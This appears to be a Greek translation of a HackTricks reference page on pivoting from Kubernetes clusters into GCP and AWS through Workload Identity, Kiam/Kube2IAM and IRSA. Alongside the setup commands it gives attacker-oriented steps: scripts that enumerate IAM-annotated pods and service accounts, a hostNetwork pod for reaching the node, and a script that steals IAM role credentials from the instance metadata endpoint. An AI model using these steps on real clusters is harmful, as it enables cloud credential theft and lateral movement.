# Κινητοποίηση σε Νέφη Kubernetes

{% hint style="success" %}
Μάθετε & εξασκηθείτε στο AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**Εκπαίδευση HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Μάθετε & εξασκηθείτε στο GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**Εκπαίδευση HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστηρίξτε το HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Εγγραφείτε** 💬 [**στην ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Κοινοποιήστε κόλπα χάκερ υποβάλλοντας PRs** στα αποθετήρια [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) στο GitHub.

</details>
{% endhint %}

## GCP

Εάν εκτελείτε έναν συστάδα k8s μέσα στο GCP, πιθανότατα θέλετε να επιτρέψετε σε κάποια εφαρμογή που εκτελείται μέσα στο συστάδα να έχει πρόσβαση στο GCP. Υπάρχουν 2 κοινοί τρόποι για να το επιτύχετε:

### Τοποθέτηση κλειδιών GCP-SA ως μυστικό

Ένας κοινός τρόπος να δώσετε **πρόσβαση σε μια εφαρμογή Kubernetes στο GCP** είναι:

* Δημιουργήστε έναν λογαριασμό υπηρεσίας GCP
* Δέστε σε αυτόν τις επιθυμητές άδειες
* Κατεβάστε ένα κλειδί json του δημιουργημένου SA
* Τοποθετήστε το ως μυστικό μέσα στο pod
* Ορίστε τη μεταβλητή περιβάλλοντος GOOGLE\_APPLICATION\_CREDENTIALS που δείχνει στη διαδρομή όπου βρίσκεται το json.

{% hint style="warning" %}
Συνεπώς, ως **επιτιθέμενος**, αν διαρρεύσετε ένα container μέσα σε ένα pod, πρέπει να ελέγξετε αν υπάρχει αυτή η **μεταβλητή περιβάλλοντος** και **αρχεία json** με διαπιστευτήρια GCP.
{% endhint %}

### Σχετικοποίηση json GSA σε μυστικό KSA

Ένας τρόπος να δώσετε πρόσβαση σε ένα GSA σε ένα συστάδα GKE είναι να τα δέσετε με τον εξής τρόπο:

* Δημιουργήστε ένα λογαριασμό υπηρεσίας Kubernetes στον ίδιο χώρο ονομάτων με το συστάδα GKE σας χρησιμοποιώντας την ακόλουθη εντολή:
```bash
Copy codekubectl create serviceaccount <service-account-name>
```
* Δημιουργήστε ένα Kubernetes Secret που περιέχει τα διαπιστευτήρια του λογαριασμού υπηρεσίας GCP στον οποίο θέλετε να χορηγήσετε πρόσβαση στο GKE cluster. Μπορείτε να το κάνετε χρησιμοποιώντας το εργαλείο γραμμής εντολών `gcloud`, όπως φαίνεται στο παρακάτω παράδειγμα:
```bash
Copy codegcloud iam service-accounts keys create <key-file-name>.json \
--iam-account <gcp-service-account-email>
kubectl create secret generic <secret-name> \
--from-file=key.json=<key-file-name>.json
```
* Δέστε το Kubernetes Secret στο λογαριασμό υπηρεσίας Kubernetes χρησιμοποιώντας την παρακάτω εντολή:
```bash
Copy codekubectl annotate serviceaccount <service-account-name> \
iam.gke.io/gcp-service-account=<gcp-service-account-email>
```
{% hint style="warning" %}
Στο **δεύτερο βήμα** ρυθμίστηκαν τα **διαπιστευτήρια του GSA ως μυστικό του KSA**. Στη συνέχεια, αν μπορείτε να **διαβάσετε αυτό το μυστικό** από **μέσα** στο **GKE** cluster, μπορείτε να **εξελιχθείτε σε αυτόν τον λογαριασμό υπηρεσιών του GCP**.
{% endhint %}

### Ταυτότητα Φορτίου GKE

Με την Ταυτότητα Φορτίου, μπορούμε να διαμορφώσουμε ένα[ λογαριασμό υπηρεσιών Kubernetes](https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/) για να λειτουργεί ως ένα[ λογαριασμό υπηρεσιών Google](https://cloud.google.com/iam/docs/understanding-service-accounts). Τα pods που εκτελούνται με τον λογαριασμό υπηρεσιών Kubernetes θα πιστοποιούνται αυτόματα ως ο λογαριασμός υπηρεσιών Google κατά την πρόσβαση στις υπηρεσίες Google Cloud.

Τα **πρώτα σειρά βημάτων** για την ενεργοποίηση αυτής της συμπεριφοράς είναι να **ενεργοποιήσετε την Ταυτότητα Φορτίου στο GCP** ([**βήματα**](https://medium.com/zeotap-customer-intelligence-unleashed/gke-workload-identity-a-secure-way-for-gke-applications-to-access-gcp-services-f880f4e74e8c)) και να δημιουργήσετε τον GCP SA που θέλετε το k8s να υποδύεται.

* **Ενεργοποίηση της Ταυτότητας Φορτίου** σε ένα νέο cluster

{% code overflow="wrap" %}
```bash
gcloud container clusters update <cluster_name> \
--region=us-central1 \
--workload-pool=<project-id>.svc.id.goog
```
{% endcode %}

* **Δημιουργία/Ενημέρωση ενός νέου nodepool** (Τα Autopilot clusters δεν χρειάζονται αυτό) 

{% code overflow="wrap" %}
```bash
# You could update instead of create
gcloud container node-pools create <nodepoolname> --cluster=<cluser_name> --workload-metadata=GKE_METADATA --region=us-central1
```
{% endcode %}

* Δημιουργήστε τον **Λογαριασμό Υπηρεσίας GCP για εκπροσώπηση** από το K8s με δικαιώματα GCP: 

{% code overflow="wrap" %}
```bash
# Create SA called "gsa2ksa"
gcloud iam service-accounts create gsa2ksa --project=<project-id>

# Give "roles/iam.securityReviewer" role to the SA
gcloud projects add-iam-policy-binding <project-id> \
--member "serviceAccount:gsa2ksa@<project-id>.iam.gserviceaccount.com" \
--role "roles/iam.securityReviewer"
```
{% endcode %}

* **Συνδεθείτε** στο **cluster** και **δημιουργήστε** τον **λογαριασμό υπηρεσίας** που θα χρησιμοποιήσετε

{% code overflow="wrap" %}
```bash
# Get k8s creds
gcloud container clusters get-credentials <cluster_name> --region=us-central1

# Generate our testing namespace
kubectl create namespace testing

# Create the KSA
kubectl create serviceaccount ksa2gcp -n testing
```
{% endcode %}

* **Συνδέστε το GSA με το KSA**

{% code overflow="wrap" %}
```bash
# Allow the KSA to access the GSA in GCP IAM
gcloud iam service-accounts add-iam-policy-binding gsa2ksa@<project-id.iam.gserviceaccount.com \
--role roles/iam.workloadIdentityUser \
--member "serviceAccount:<project-id>.svc.id.goog[<namespace>/ksa2gcp]"

# Indicate to K8s that the SA is able to impersonate the GSA
kubectl annotate serviceaccount ksa2gcp \
--namespace testing \
iam.gke.io/gcp-service-account=gsa2ksa@security-devbox.iam.gserviceaccount.com
```
{% endcode %}

* Εκτελέστε ένα **pod** με το **KSA** και ελέγξτε την **πρόσβαση** στο **GSA:**
```bash
# If using Autopilot remove the nodeSelector stuff!
echo "apiVersion: v1
kind: Pod
metadata:
name: workload-identity-test
namespace: <namespace>
spec:
containers:
- image: google/cloud-sdk:slim
name: workload-identity-test
command: ['sleep','infinity']
serviceAccountName: ksa2gcp
nodeSelector:
iam.gke.io/gke-metadata-server-enabled: 'true'" | kubectl apply -f-

# Get inside the pod
kubectl exec -it workload-identity-test \
--namespace testing \
-- /bin/bash

# Check you can access the GSA from insie the pod with
curl -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/email
gcloud auth list
```
Ελέγξτε την παρακάτω εντολή για πιστοποίηση σε περίπτωση που χρειαστεί:

{% code overflow="wrap" %}
```bash
gcloud auth activate-service-account --key-file=/var/run/secrets/google/service-account/key.json
```
{% endcode %}

{% hint style="warning" %}
Ως επιτιθέμενος μέσα στο K8s θα πρέπει να **αναζητήσετε τα SAs** με τη **σημείωση `iam.gke.io/gcp-service-account`** καθώς αυτό υποδηλώνει ότι το SA μπορεί να έχει πρόσβαση σε κάτι στο GCP. Μια άλλη επιλογή θα ήταν να προσπαθήσετε να καταχραστείτε κάθε KSA στο cluster και να ελέγξετε αν έχει πρόσβαση.\
Από το GCP είναι πάντα ενδιαφέρον να απαριθμήσετε τις συνδέσεις και να γνωρίζετε **ποια πρόσβαση δίνετε στα SAs μέσα στο Kubernetes**.
{% endhint %}

Αυτό είναι ένα script για **εύκολη επανάληψη όλων των ορισμών των pods** ψάχνοντας για αυτήν τη **σημείωση**:
```bash
for ns in `kubectl get namespaces -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
for pod in `kubectl get pods -n "$ns" -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
echo "Pod: $ns/$pod"
kubectl get pod "$pod" -n "$ns" -o yaml | grep "gcp-service-account"
echo ""
echo ""
done
done | grep -B 1 "gcp-service-account"
```
## AWS

### Kiam & Kube2IAM (IAM ρόλος για Pods) <a href="#workflow-of-iam-role-for-service-accounts" id="workflow-of-iam-role-for-service-accounts"></a>

Ένας (απαρχαιωμένος) τρόπος να δώσετε IAM Roles σε Pods είναι να χρησιμοποιήσετε έναν [**Kiam**](https://github.com/uswitch/kiam) ή έναν [**Kube2IAM**](https://github.com/jtblin/kube2iam) **server.** Βασικά, θα χρειαστεί να εκτελέσετε ένα **daemonset** στο cluster σας με έναν είδος προνομιούχου IAM ρόλου. Αυτό το daemonset θα είναι αυτό που θα δίνει πρόσβαση σε IAM ρόλους στα pods που το χρειάζονται.

Καταρχάς, πρέπει να διαμορφώσετε **ποιοι ρόλοι μπορούν να έχουν πρόσβαση μέσα στο namespace**, και το κάνετε με ένα σχόλιο μέσα στο αντικείμενο namespace:

{% code title="Kiam" %}
```yaml
kind: Namespace
metadata:
name: iam-example
annotations:
iam.amazonaws.com/permitted: ".*"
```
{% endcode %}

{% code title="Kube2iam" %}
```yaml
apiVersion: v1
kind: Namespace
metadata:
annotations:
iam.amazonaws.com/allowed-roles: |
["role-arn"]
name: default
```
{% endcode %}

Μόλις ο χώρος ονομάτων ρυθμιστεί με τους ρόλους IAM που μπορεί να έχουν τα Pods, μπορείτε **να υποδείξετε τον ρόλο που θέλετε σε κάθε ορισμό pod με κάτι παρόμοιο με**:

{% code title="Kiam & Kube2iam" %}
```yaml
kind: Pod
metadata:
name: foo
namespace: external-id-example
annotations:
iam.amazonaws.com/role: reportingdb-reader
```
{% endcode %}

{% hint style="warning" %}
Ως επιτιθέμενος, αν **βρείτε αυτές τις σημειώσεις** σε pods ή namespaces ή έναν διακομιστή kiam/kube2iam που εκτελείται (στο kube-system πιθανότατα), μπορείτε να **υποκαταστήσετε κάθε ρ**όλο που χρησιμοποιείται ήδη από τα pods και περισσότερα (αν έχετε πρόσβαση στο AWS λογαριασμό απαριθμήστε τους ρόλους).
{% endhint %}

#### Δημιουργία Pod με ρόλο IAM

{% hint style="info" %}
Ο ρόλος IAM που πρέπει να υποδειχθεί πρέπει να βρίσκεται στον ίδιο λογαριασμό AWS με τον ρόλο kiam/kube2iam και αυτός ο ρόλος πρέπει να μπορεί να τον προσπελάσει.
{% endhint %}
```yaml
echo 'apiVersion: v1
kind: Pod
metadata:
annotations:
iam.amazonaws.com/role: transaction-metadata
name: alpine
namespace: eevee
spec:
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args: ["-c", "sleep 100000"]' | kubectl apply -f -
```
### IAM Ρόλος για Λογαριασμούς Υπηρεσιών K8s μέσω του OIDC <a href="#workflow-of-iam-role-for-service-accounts" id="workflow-of-iam-role-for-service-accounts"></a>

Αυτή είναι ο **συνιστώμενος τρόπος από την AWS**.

1. Καταρχήν πρέπει να [δημιουργήσετε έναν πάροχο OIDC για το cluster](https://docs.aws.amazon.com/eks/latest/userguide/enable-iam-roles-for-service-accounts.html).
2. Στη συνέχεια δημιουργείτε έναν IAM ρόλο με τα δικαιώματα που θα χρειαστεί ο SA.
3. Δημιουργήστε μια [σχέση εμπιστοσύνης μεταξύ του IAM ρόλου και του SA](https://docs.aws.amazon.com/eks/latest/userguide/associate-service-account-role.html) όνομα (ή των περιοχών που δίνουν πρόσβαση στο ρόλο σε όλους τους SAs της περιοχής). _Η σχέση εμπιστοσύνης θα ελέγχει κυρίως το όνομα του πάροχου OIDC, το όνομα της περιοχής και το όνομα του SA_.
4. Τέλος, **δημιουργήστε έναν SA με ένα σχόλιο που υποδεικνύει το ARN του ρόλου**, και οι pods που τρέχουν με αυτόν τον SA θα έχουν **πρόσβαση στο διακριτικό του ρόλου**. Το **διακριτικό** είναι **γραμμένο** μέσα σε ένα αρχείο και η διαδρομή καθορίζεται στο **`AWS_WEB_IDENTITY_TOKEN_FILE`** (προεπιλογή: `/var/run/secrets/eks.amazonaws.com/serviceaccount/token`)
```bash
# Create a service account with a role
cat >my-service-account.yaml <<EOF
apiVersion: v1
kind: ServiceAccount
metadata:
name: my-service-account
namespace: default
annotations:
eks.amazonaws.com/role-arn: arn:aws:iam::318142138553:role/EKSOIDCTesting
EOF
kubectl apply -f my-service-account.yaml

# Add a role to an existent service account
kubectl annotate serviceaccount -n $namespace $service_account eks.amazonaws.com/role-arn=arn:aws:iam::$account_id:role/my-role
```
Για να **λάβετε το aws χρησιμοποιώντας το token** από `/var/run/secrets/eks.amazonaws.com/serviceaccount/token` εκτελέστε:

{% code overflow="wrap" %}
```bash
aws sts assume-role-with-web-identity --role-arn arn:aws:iam::123456789098:role/EKSOIDCTesting --role-session-name something --web-identity-token file:///var/run/secrets/eks.amazonaws.com/serviceaccount/token
```
{% endcode %}

{% hint style="warning" %}
Ως επιτιθέμενος, αν μπορείτε να απαριθμήσετε έναν συμπλέγμα K8s, ελέγξτε τους λογαριασμούς υπηρεσιών με αυτήν τη σημείωση για να εξελιχθείτε στο AWS. Για να το κάνετε αυτό, απλώς εκτελέστε/δημιουργήστε ένα pod χρησιμοποιώντας έναν από τους λογαριασμούς υπηρεσιών IAM με προνομιούχα και κλέψτε το token.

Επιπλέον, αν βρίσκεστε μέσα σε ένα pod, ελέγξτε τις μεταβλητές περιβάλλοντος όπως AWS_ROLE_ARN και AWS_WEB_IDENTITY_TOKEN.
{% endhint %}

{% hint style="danger" %}
Μερικές φορές η Πολιτική Εμπιστοσύνης ενός ρόλου μπορεί να είναι κακά διαμορφωμένη και αντί να δίνει πρόσβαση AssumeRole στον αναμενόμενο λογαριασμό υπηρεσίας, τη δίνει σε όλους τους λογαριασμούς υπηρεσιών. Επομένως, αν μπορείτε να γράψετε μια σημείωση σε έναν ελεγχόμενο λογαριασμό υπηρεσίας, μπορείτε να έχετε πρόσβαση στον ρόλο.

Ελέγξτε την ακόλουθη σελίδα για περισσότερες πληροφορίες:
{% endhint %}

{% content-ref url="../aws-security/aws-basic-information/aws-federation-abuse.md" %}
[aws-federation-abuse.md](../aws-security/aws-basic-information/aws-federation-abuse.md)
{% endcontent-ref %}

### Βρείτε Pods και SAs με IAM Roles στο Σύμπλεγμα

Αυτό είναι ένα σενάριο για να εξετάσετε εύκολα όλα τα pods και τις ορισμούς sas ψάχνοντας για αυτήν τη σημείωση:
```bash
for ns in `kubectl get namespaces -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
for pod in `kubectl get pods -n "$ns" -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
echo "Pod: $ns/$pod"
kubectl get pod "$pod" -n "$ns" -o yaml | grep "amazonaws.com"
echo ""
echo ""
done
for sa in `kubectl get serviceaccounts -n "$ns" -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
echo "SA: $ns/$sa"
kubectl get serviceaccount "$sa" -n "$ns" -o yaml | grep "amazonaws.com"
echo ""
echo ""
done
done | grep -B 1 "amazonaws.com"
```
### Ρόλος IAM του Κόμβου

Η προηγούμενη ενότητα αφορούσε το πώς να κλέψετε τους ρόλους IAM με τις pods, αλλά σημειώστε ότι ένα **Κόμβος του** cluster K8s θα είναι ένα **παράδειγμα μέσα στο cloud**. Αυτό σημαίνει ότι είναι πολύ πιθανό ο Κόμβος να **έχει έναν νέο ρόλο IAM που μπορείτε να κλέψετε** (_σημείωση ότι συνήθως όλοι οι κόμβοι ενός cluster K8s θα έχουν τον ίδιο ρόλο IAM, οπότε μπορεί να μην αξίζει τον κόπο να ελέγξετε κάθε κόμβο_).

Ωστόσο, υπάρχει ένα σημαντικό απαιτούμενο για να έχετε πρόσβαση στο σημείο μεταδεδομένων από τον κόμβο, πρέπει να είστε στον κόμβο (συνεδρία ssh;) ή τουλάχιστον να έχετε το ίδιο δίκτυο:
```bash
kubectl run NodeIAMStealer --restart=Never -ti --rm --image lol --overrides '{"spec":{"hostNetwork": true, "containers":[{"name":"1","image":"alpine","stdin": true,"tty":true,"imagePullPolicy":"IfNotPresent"}]}}'
```
### Κλοπή IAM Role Token

Προηγουμένως έχουμε συζητήσει πως να **συνδέσουμε IAM Roles σε Pods** ή ακόμα και πως να **δραπετεύσουμε στον Κόμβο για να κλέψουμε το IAM Role** που έχει επισυναφθεί σε αυτόν.

Μπορείτε να χρησιμοποιήσετε τον παρακάτω κώδικα για να **κλέψετε** τα νέα σας σκληρά **δουλευμένα διαπιστευτήρια IAM role**:
```bash
IAM_ROLE_NAME=$(curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null || wget  http://169.254.169.254/latest/meta-data/iam/security-credentials/ -O - 2>/dev/null)
if [ "$IAM_ROLE_NAME" ]; then
echo "IAM Role discovered: $IAM_ROLE_NAME"
if ! echo "$IAM_ROLE_NAME" | grep -q "empty role"; then
echo "Credentials:"
curl "http://169.254.169.254/latest/meta-data/iam/security-credentials/$IAM_ROLE_NAME" 2>/dev/null || wget "http://169.254.169.254/latest/meta-data/iam/security-credentials/$IAM_ROLE_NAME" -O - 2>/dev/null
fi
fi
```
## Αναφορές

* [https://cloud.google.com/kubernetes-engine/docs/how-to/workload-identity](https://cloud.google.com/kubernetes-engine/docs/how-to/workload-identity)
* [https://medium.com/zeotap-customer-intelligence-unleashed/gke-workload-identity-a-secure-way-for-gke-applications-to-access-gcp-services-f880f4e74e8c](https://medium.com/zeotap-customer-intelligence-unleashed/gke-workload-identity-a-secure-way-for-gke-applications-to-access-gcp-services-f880f4e74e8c)
* [https://blogs.halodoc.io/iam-roles-for-service-accounts-2/](https://blogs.halodoc.io/iam-roles-for-service-accounts-2/)

{% hint style="success" %}
Μάθετε & εξασκηθείτε στο Hacking του AWS:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**Εκπαίδευση HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Μάθετε & εξασκηθείτε στο Hacking του GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**Εκπαίδευση HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστηρίξτε το HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Εγγραφείτε** 💬 [**στην ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε κόλπα hacking υποβάλλοντας PRs** στα αποθετήρια [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}
